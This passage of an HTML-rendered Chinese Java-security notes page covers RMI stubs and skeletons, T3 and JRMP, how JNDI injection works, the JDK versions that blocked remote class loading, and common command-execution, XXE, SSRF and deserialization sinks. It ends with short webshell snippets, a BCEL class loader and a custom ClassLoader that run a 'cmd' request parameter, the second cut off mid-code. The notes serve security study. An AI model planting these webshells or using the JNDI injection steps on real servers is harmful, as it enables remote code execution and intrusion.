keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServerSocket</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person_Skeleton</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Thread</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">PersonServer</span> myServer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person_Skeleton</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">PersonServer</span> server<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// get reference of object server</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>myServer <span class=\"token operator\">=</span> server<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token comment\">// new socket at port 9000</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token class-name\">ServerSocket</span> serverSocket <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServerSocket</span><span class=\"token punctuation\">(</span><span class=\"token number\">9000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token comment\">// accept stub's request</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token class-name\">Socket</span> socket <span class=\"token operator\">=</span> serverSocket<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>socket <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token comment\">// get stub's request</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token class-name\">ObjectInputStream</span> inStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token class-name\">String</span> method <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>inStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token comment\">// check method name</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"age\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    <span class=\"token comment\">// execute object server's business method</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                    <span class=\"token keyword\">int</span> age <span class=\"token operator\">=</span> myServer<span class=\"token punctuation\">.</span><span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                    <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    <span class=\"token comment\">// return result to stub</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                    <span class=\"token comment\">// execute object server's business method</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                    <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> myServer<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                    <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                    <span class=\"token comment\">// return result to stub</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> t<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            t<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> args <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token comment\">// new object server</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token class-name\">PersonServer</span> person <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PersonServer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Richard\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token class-name\">Person_Skeleton</span> skel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person_Skeleton</span><span class=\"token punctuation\">(</span>person<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        skel<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"client实现\"><a class=\"anchor\" href=\"#client实现\">#</a> Client 实现</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">PersonClient</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">Person</span> person <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person_Stub</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">int</span> age <span class=\"token operator\">=</span> person<span class=\"token punctuation\">.</span><span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> person<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\" is \"</span> <span class=\"token operator\">+</span> age <span class=\"token operator\">+</span> <span class=\"token string\">\" years old\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> t<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            t<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"t3协议\"><a class=\"anchor\" href=\"#t3协议\">#</a> T3 协议</h2>\n<p>T3 协议是用于在 WebLogic 服务器和其他类型的 Java 程序之间传输信息的协议，是 Weblogic 对 RMI 规范的实现。简单来说，可以把 T3 视为暴露 JDNI 给用户调用的接口。</p>\n<h2 id=\"jrmp\"><a class=\"anchor\" href=\"#jrmp\">#</a> JRMP</h2>\n<p>Java 远程方法协议 (Java Remote Method Protocol，JRMP) 是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 (RMI) 之下、TCP/IP 之上的线路层协议。</p>\n<p>JRMP 是一个 Java 特有的、适用于 Java 之间远程调用的基于流的协议，要求客户端和服务器上都使用 Java 对象。</p>\n<h1 id=\"jndi\"><a class=\"anchor\" href=\"#jndi\">#</a> JNDI</h1>\n<h2 id=\"简介-12\"><a class=\"anchor\" href=\"#简介-12\">#</a> 简介</h2>\n<p>JNDI (Java Naming and Directory Interface，Java 命名和目录接口) 是为 Java 应用程序提供命名和目录访问服务的 API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如 RMI、CORBA、LDAP、DNS 等。</p>\n<p>其中 Naming Service 类似于哈希表的 K/V 对，通过名称去获取对应的服务。Directory Service 是一种特殊的 Naming Service，用类似目录的方式来存取服务。</p>\n<p><img data-src=\"https://s2.loli.net/2022/11/27/e7VaR9mvNITk6U1.png\" alt=\"\" /></p>\n<h2 id=\"jndi注入\"><a class=\"anchor\" href=\"#jndi注入\">#</a> JNDI 注入</h2>\n<p>JNDI 注入是 2016 年由 pentester 在 BlackHat USA 上的  <code>A Journey From JNDI LDAP Manipulation To RCE</code>  议题提出的。</p>\n<p>其攻击过程如下</p>\n<ol>\n<li>攻击者将 Payload 绑定到攻击者的命名 / 目录服务中</li>\n<li>攻击者将绝对 URL 注入易受攻击的 JNDI 查找方法</li>\n<li>应用程序执行查找</li>\n<li>应用程序连接到攻击者控制的 JNDI 服务并返回 Payload</li>\n<li>应用程序解码响应并触发有效负载</li>\n</ol>\n<h2 id=\"攻击载荷\"><a class=\"anchor\" href=\"#攻击载荷\">#</a> 攻击载荷</h2>\n<p>JDNI 主要有几种攻击载荷：</p>\n<ul>\n<li>CORBA</li>\n<li>IOR</li>\n<li>JNDI Reference</li>\n<li>LDAP</li>\n<li>Remote Location</li>\n<li>Remote Object</li>\n<li>RMI</li>\n<li>Serialized Object</li>\n</ul>\n<h3 id=\"rmi-remote-object\"><a class=\"anchor\" href=\"#rmi-remote-object\">#</a> RMI Remote Object</h3>\n<p>攻击者实现一个 RMI 恶意远程对象并绑定到 RMI Registry 上，将编译后的 RMI 远程对象类放在 HTTP/FTP/SMB 等服务器上。其中 Codebase 地址由远程服务器的  <code>java.rmi.server.codebase</code>  属性设置，供受害者的 RMI 客户端远程加载。</p>\n<p>利用条件如下：</p>\n<ul>\n<li>RMI 客户端的上下文环境允许访问远程 Codebase。</li>\n<li>属性  <code>java.rmi.server.useCodebaseOnly</code>  的值为 false。</li>\n</ul>\n<p>其中 JDK 6u45、7u21 后， <code>java.rmi.server.useCodebaseOnly</code>  的值默认为 true。</p>\n<h3 id=\"rmi-jndi-reference\"><a class=\"anchor\" href=\"#rmi-jndi-reference\">#</a> RMI + JNDI Reference</h3>\n<p>攻击者通过 RMI 服务返回一个 JNDI Naming Reference，受害者解码 Reference 时会去攻击者指定的远程地址加载 Factory 类。这种方式原理上并非使用 RMI Class Loading 机制，因此不受  <code>java.rmi.server.useCodebaseOnly</code>  系统属性的限制。但是在 JDK 6u132, JDK 7u122, JDK 8u113 后限制了 Naming/Directory 服务中 JNDI Reference 远程加载 Object Factory 类的特性。系统属性  <code>com.sun.jndi.rmi.object.trustURLCodebase</code>  、  <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。</p>\n<h3 id=\"ldap-jndi-reference\"><a class=\"anchor\" href=\"#ldap-jndi-reference\">#</a> LDAP + JNDI Reference</h3>\n<p>Java 的 LDAP 可以在属性值中存储特定的 Java 对象，且 LDAP 服务的 Reference 远程加载 Factory 类不受  <code>com.sun.jndi.rmi.object.trustURLCodebase</code>  、 <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  等属性的限制，适用范围更广。</p>\n<h1 id=\"jdk-2\"><a class=\"anchor\" href=\"#jdk-2\">#</a> JDK</h1>\n<h2 id=\"jdk-8\"><a class=\"anchor\" href=\"#jdk-8\">#</a> JDK 8</h2>\n<ul>\n<li><code>sun.net.www.protocol</code>  不再支持 gopher 协议</li>\n</ul>\n<h3 id=\"8u251\"><a class=\"anchor\" href=\"#8u251\">#</a> 8u251</h3>\n<ul>\n<li>com.sun.org.apache.bcel.internal.util.ClassLoader 类被删除</li>\n</ul>\n<h3 id=\"8u191\"><a class=\"anchor\" href=\"#8u191\">#</a> 8u191</h3>\n<ul>\n<li>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"8u121\"><a class=\"anchor\" href=\"#8u121\">#</a> 8u121</h3>\n<ul>\n<li>RMI 加入了反序列化白名单机制</li>\n<li>RMI 远程 Reference 代码默认不信任，影响 RMI 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"8u113\"><a class=\"anchor\" href=\"#8u113\">#</a> 8u113</h3>\n<ul>\n<li><code>com.sun.jndi.rmi.object.trustURLCodebase</code>  默认为 false</li>\n<li><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  默认为 false</li>\n</ul>\n<h2 id=\"jdk-7\"><a class=\"anchor\" href=\"#jdk-7\">#</a> JDK 7</h2>\n<h3 id=\"7u201\"><a class=\"anchor\" href=\"#7u201\">#</a> 7u201</h3>\n<ul>\n<li>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"7u122\"><a class=\"anchor\" href=\"#7u122\">#</a> 7u122</h3>\n<ul>\n<li><code>com.sun.jndi.rmi.object.trustURLCodebase</code>  默认为 false</li>\n<li><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  默认为 false</li>\n</ul>\n<h3 id=\"7u40\"><a class=\"anchor\" href=\"#7u40\">#</a> 7u40</h3>\n<ul>\n<li><code>java.io.File</code>  类中添加了  <code>isInvalid</code>  方法，检测文件名中是否包含空字节</li>\n</ul>\n<h2 id=\"jdk-6\"><a class=\"anchor\" href=\"#jdk-6\">#</a> JDK 6</h2>\n<h3 id=\"6u211\"><a class=\"anchor\" href=\"#6u211\">#</a> 6u211</h3>\n<ul>\n<li>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"6u141\"><a class=\"anchor\" href=\"#6u141\">#</a> 6u141</h3>\n<ul>\n<li><code>com.sun.jndi.rmi.object.trustURLCodebase</code>  默认为 false</li>\n<li><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  默认为 false</li>\n</ul>\n<h3 id=\"6u45\"><a class=\"anchor\" href=\"#6u45\">#</a> 6u45</h3>\n<ul>\n<li>java.rmi.server.useCodebaseOnly 默认为 true，禁用自动加载远程类文件</li>\n</ul>\n<h1 id=\"常见sink\"><a class=\"anchor\" href=\"#常见sink\">#</a> 常见 Sink</h1>\n<h2 id=\"命令执行注入\"><a class=\"anchor\" href=\"#命令执行注入\">#</a> 命令执行 / 注入</h2>\n<ul>\n<li>java.lang.Runtime.getRuntime().exec()</li>\n<li>java.lang.ProcessBuilder</li>\n</ul>\n<h2 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h2>\n<ul>\n<li>java.net.bull.javamelody.PayloadNameRequestWrapper</li>\n<li>javax.xml.bind.Unmarshaller</li>\n<li>javax.xml.parsers.DocumentBuilderFactory</li>\n<li>javax.xml.parsers.SAXParser</li>\n<li>javax.xml.stream.XMLStreamReader</li>\n<li>javax.xml.transform.sax.SAXSource</li>\n<li>javax.xml.transform.sax.SAXTransformerFactory</li>\n<li>javax.xml.transform.TransformerFactory</li>\n<li>javax.xml.validation.SchemaFactory</li>\n<li>javax.xml.validation.Validator</li>\n<li>javax.xml.xpath.XpathExpression</li>\n<li>org.apache.commons.digester3.Digester</li>\n<li>org.apache.ofbiz.base.util.UtilXml</li>\n<li>org.dom4j.io.SAXReader</li>\n<li>org.jdom.input.SAXBuilder</li>\n<li>org.jdom2.input.SAXBuilder</li>\n<li>org.xml.sax.helpers.XMLReaderFactory</li>\n<li>org.xml.sax.XMLReader</li>\n</ul>\n<h2 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<ul>\n<li>HttpClient.execute</li>\n<li>HttpClients.execute</li>\n<li>HttpURLConnection.getInputStream</li>\n<li>ImageIO.read</li>\n<li>OkHttpClient.newCall.execute</li>\n<li>Request.Get.execute</li>\n<li>Request.Post.execute</li>\n<li>URL.openStream</li>\n<li>URLConnection.getInputStream</li>\n</ul>\n<h2 id=\"反序列化-2\"><a class=\"anchor\" href=\"#反序列化-2\">#</a> 反序列化</h2>\n<h3 id=\"相关sink函数\"><a class=\"anchor\" href=\"#相关sink函数\">#</a> 相关 Sink 函数</h3>\n<ul>\n<li><code>JSON.parseObject</code></li>\n<li><code>ObjectInputStream.readObject</code></li>\n<li><code>ObjectInputStream.readUnshared</code></li>\n<li><code>ObjectMapper.readValue</code></li>\n<li><code>XMLDecoder.readObject</code></li>\n<li><code>XStream.fromXML</code></li>\n<li><code>Yaml.load</code></li>\n</ul>\n<h3 id=\"magic-call\"><a class=\"anchor\" href=\"#magic-call\">#</a> Magic Call</h3>\n<p>以下的魔术方法都会在反序列化过程中被自动的调用。</p>\n<ul>\n<li><code>readObject</code></li>\n<li><code>readExternal</code></li>\n<li><code>readResolve</code></li>\n<li><code>readObjectNoData</code></li>\n<li><code>validateObject</code></li>\n<li><code>finalize</code></li>\n</ul>\n<h3 id=\"主流json库\"><a class=\"anchor\" href=\"#主流json库\">#</a> 主流 JSON 库</h3>\n<p>主流的 JSON 库有 Gson、Jackson、Fastjson 等，因为 JSON 常在反序列化中使用，所以相关库都有较大的影响。</p>\n<p>其中 Gson 默认只能反序列化基本类型，如果是复杂类型，需要程序员实现反序列化机制，相对比较安全。</p>\n<p>Jackson 除非指明 @jsonAutoDetect，Jackson 不会反序列化非 public 属性。在防御时，可以不使用 enableDefaultTyping 方法。相关 CVE 有 CVE-2017-7525、CVE-2017-15095。</p>\n<p>FastJson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也支持从 JSON 字符串反序列化到 Java Bean，相关 CVE 有 CVE-2017-18349 等。</p>\n<p>FastJson 常见的 Sink 点有：</p>\n<ul>\n<li><code>JSON.toJSONString</code></li>\n<li><code>JSON.parseObject</code></li>\n<li><code>JSON.parse</code></li>\n</ul>\n<h1 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> WebShell</h1>\n<h2 id=\"bcel字节码\"><a class=\"anchor\" href=\"#bcel字节码\">#</a> BCEL 字节码</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">String</span> bcelCode <span class=\"token operator\">=</span> <span class=\"token string\">\"...\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>response<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>bcelCode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"自定义类加载器\"><a class=\"anchor\" href=\"#自定义类加载器\">#</a> 自定义类加载器</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>response<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token class-name\">Base64</span><span class=\"token 